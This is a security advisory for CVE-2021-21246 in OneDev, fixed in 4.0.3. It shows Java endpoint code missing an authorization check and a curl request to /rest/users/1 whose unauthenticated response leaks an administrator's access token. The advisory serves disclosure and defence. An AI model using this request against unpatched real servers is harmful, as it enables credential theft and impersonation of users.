# Pre-Auth Access token leak

Critical

## Package

## Description

### Impact

The REST [`UserResource`](https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/rest/UserResource.java) endpoint performs a security check to make sure that only administrators can list user details. For the `/users/` endpoint we have:

```
@ValidQueryParams
@GET
public Response query(@QueryParam("name") String name, @Email @QueryParam("email") String email, @QueryParam("offset") Integer offset, @QueryParam("count") Integer count, @Context UriInfo uriInfo) {
  if (!SecurityUtils.isAdministrator())
    throw new UnauthorizedException("Unauthorized access to user profiles");
  ...
}

```

However for the `/users/{id}` endpoint there are no security checks enforced so it is possible to retrieve arbitrary user details:

```
@Path("/{userId}")
public User get(@PathParam("userId") Long userId) {
  return userManager.load(userId);
}

```

For the protected endpoint, we get an `Unauthorized access` error:

```
curl -X GET -H "Content-Type: application/json" http://localhost:6610/rest/users
Unauthorized access to user profiles

```

But for the `/users/{}` endpoint we can list full user details, including their Access Tokens!

```
curl -X GET -H "Content-Type: application/json" http://localhost:6610/rest/users/1
{
  "id" : 1,
  "name" : "admin",
  "fullName" : "admin",
  "ssoInfo" : {
    "connector" : null,
    "subject" : "4a155bff-715d-45e9-8898-4152bb97d25e"
  },
  "email" : "alvaro@pwntester.com",
  "accessToken" : "JqnqWs6YsP8x3poNpnj6J6GFbvh0szli6lr5BWH8",
  "userProjectQueries" : [ ],
  "userIssueQueries" : [ ],
  "userIssueQueryWatches" : { },
  "issueQueryWatches" : { },
  "userPullRequestQueries" : [ ],
  "userPullRequestQueryWatches" : { },
  "pullRequestQueryWatches" : { },
  "userBuildQueries" : [ ],
  "userBuildQuerySubscriptions" : [ ],
  "buildQuerySubscriptions" : [ ]
}

```

These access tokens can be used to access the API or clone code in the build spec via the HTTP(S) protocol. It has permissions to all projects accessible by the user account.

This issue may lead to `Sensitive data leak` and leak the Access Token which can be used to impersonate the administrator or any other users.

### Patches

This issue was addressed in 4.0.3 by removing user info from restful api.

### Credits

This issue was discovered by [@pwntester](https://github.com/pwntester)

### Severity

Critical

### CVE ID

CVE-2021-21246

### Weaknesses

No CWEs
